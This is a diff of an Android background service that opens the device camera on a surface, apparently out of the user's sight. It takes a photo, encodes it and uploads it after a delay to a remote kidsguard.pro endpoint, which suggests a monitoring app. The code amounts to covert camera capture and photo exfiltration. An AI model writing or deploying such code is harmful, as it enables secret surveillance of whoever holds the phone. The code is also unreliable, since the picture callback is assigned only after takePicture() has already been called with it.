@@ -21,6 +21,11 @@ import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+
 public class TakePictureervice extends Service implements SurfaceHolder.Callback{
     private WindowManager windowManager;
     private SurfaceView surfaceView;
@@ -115,7 +120,9 @@ public class TakePictureervice extends Service implements SurfaceHolder.Callback
 
                 SendPic sendPic=new SendPic();
 //                sendPic.send(BlockActivity.this,encodedImage,"https://req.kidsguard.pro/api/putPic/");
+//                Log.e("testingma", encodedImage );
                 sendPic.send(getApplicationContext(),encodedImage,"https://im.kidsguard.pro/api/put-picture/");
+                onDestroy();
             }
         },12000);
         return super.onStartCommand(intent, flags, startId);
@@ -123,33 +130,43 @@ public class TakePictureervice extends Service implements SurfaceHolder.Callback
 
     @Override
     public void surfaceCreated(SurfaceHolder surfaceHolder) {
-        if (a==1){
-            try{
-                camera =Camera.open(1);
-                camera.setPreviewDisplay(surfaceHolder);
-                camera.startPreview();
+        try {
 
-            }catch (Exception e){
-                Log.e("onPictureTaken", e.toString() );
-            }}else {try{
-            camera =Camera.open();
-            camera.setPreviewDisplay(surfaceHolder);
-            camera.startPreview();
+
+            if (a == 1) {
+                try {
+                    camera = Camera.open(1);
+                    camera.setPreviewDisplay(surfaceHolder);
+                    camera.startPreview();
+
+                } catch (Exception e) {
+                    Log.e("onPictureTaken", e.toString());
+                }
+            } else {
+                try {
+                    camera = Camera.open();
+                    camera.setPreviewDisplay(surfaceHolder);
+                    camera.startPreview();
+                } catch (Exception e) {
+                    Log.e("onPictureTaken", e.toString());
+                }
+            }
+
+            surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
+            surfaceHolder.addCallback(this);
+            camera.takePicture(null, null, mPictureCallback);
+            mPictureCallback = new Camera.PictureCallback() {
+                @Override
+                public void onPictureTaken(byte[] data, Camera camera) {
+
+                    bitmap1 = BitmapFactory.decodeByteArray(data, 0, data.length);
+                    Utils utils = new Utils();
+                    encodedImage = utils.getStringImage(bitmap1, 200);//this code and util class for convert bitmab to string
+                }
+            };
         }catch (Exception e){
             Log.e("onPictureTaken", e.toString() );
-        }}
-
-        surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
-        surfaceHolder.addCallback(this);
-        camera.takePicture(null,null,mPictureCallback);
-        mPictureCallback =new Camera.PictureCallback() {
-            @Override
-            public void onPictureTaken(byte[] data, Camera camera) {
-                bitmap1= BitmapFactory.decodeByteArray(data,0,data.length);
-                Utils utils=new Utils();
-                encodedImage = utils.getStringImage(bitmap1, 200);//this code and util class for convert bitmab to string
-            }
-        };
+        }
 
     }
 
